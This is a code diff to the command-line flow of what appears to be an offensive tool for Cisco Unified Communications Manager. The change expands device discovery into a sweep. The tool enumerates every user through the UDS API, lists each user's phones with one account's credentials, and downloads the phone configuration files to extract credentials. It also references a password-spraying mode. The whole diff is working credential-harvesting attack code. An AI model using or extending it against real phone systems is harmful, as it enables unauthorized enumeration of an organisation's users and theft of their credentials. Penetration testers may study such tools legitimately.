@@ -2723,31 +2723,32 @@ def main():
             print('--uds-devices requires both --uds-user and --uds-password')
             quit(1)
 
-        print(f'Discovering devices for user {args.uds_user!r} via '
-              f'https://{CUCM_host}:{args.uds_port}/cucm-uds/user/{quote(args.uds_user, safe="")}')
-        status, devices = get_user_devices_authenticated(
-            CUCM_host, args.uds_user, args.uds_password, port=args.uds_port,
-        )
-        if status == 'unauthorized':
-            print(f'[-] UDS rejected credentials for {args.uds_user!r} (HTTP 401)')
-            quit(1)
-        if status == 'error':
-            print(f'[-] Could not query UDS devices for {args.uds_user!r} (run with -d for details)')
-            quit(1)
-        if not devices:
-            print(f'[-] Authenticated successfully, but no devices are associated with {args.uds_user!r}')
+        print(f'Enumerating users from https://{CUCM_host}:{args.uds_port}/cucm-uds/users')
+        users = get_users_api(CUCM_host, port=args.uds_port)
+        if not users:
+            print('[-] No users returned from UDS — cannot sweep devices (run with -d for details)')
             quit(0)
 
-        print(f'[+] Discovered {len(devices)} device(s):')
-        for device_name in devices:
-            print(f'    {device_name}')
-            if not no_db:
-                log_uds_device(CUCM_host, args.uds_user, device_name, 'uds_auth', db_file)
+        print(f'[*] Sweeping devices for {len(users)} user(s) using credentials for {args.uds_user!r}...')
+        sweep = enumerate_devices_authenticated(
+            CUCM_host, args.uds_user, args.uds_password, args.uds_port,
+            users, db_file, threads=threads, no_db=no_db,
+        )
+
+        all_seps = sorted({dev for devs in sweep['devices'].values() for dev in devs})
+        print(f'[+] Sweep complete: {sweep["ok"]} ok, {sweep["denied"]} denied, '
+              f'{sweep["errors"]} error(s); {len(all_seps)} unique device(s) found across '
+              f'{len(sweep["devices"])} user(s)')
+        for target_user in sorted(sweep['devices']):
+            print(f'    {target_user}: {", ".join(sweep["devices"][target_user])}')
+
+        if not all_seps:
+            quit(0)
 
         hits = download_uds_discovered_configs(
-            CUCM_host, devices, db_file, use_tftp=use_tftp, no_db=no_db,
+            CUCM_host, all_seps, db_file, use_tftp=use_tftp, no_db=no_db,
         )
-        print(f'[+] Config download complete: {hits}/{len(devices)} configs yielded credentials')
+        print(f'[+] Config download complete: {hits}/{len(all_seps)} configs yielded credentials')
         quit(0)
 
     if args.spray:
